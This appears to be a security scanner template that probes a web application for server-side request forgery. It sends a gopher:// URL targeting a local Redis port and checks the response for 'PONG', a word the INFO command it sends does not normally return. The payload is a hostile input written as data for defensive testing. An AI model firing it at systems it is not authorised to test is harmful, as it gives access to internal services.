id: ssrf4-04
name: 'SSRF scheme gopher via link'
severity: high
type: active
tags:
  - ssrf
  - oob
  - scheme
description: 'Fetches gopher URL via link (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      link:
        - 'gopher://127.0.0.1:6379/_INFO'
    matchers:
      - type: word
        part: body
        words:
          - 'PONG'
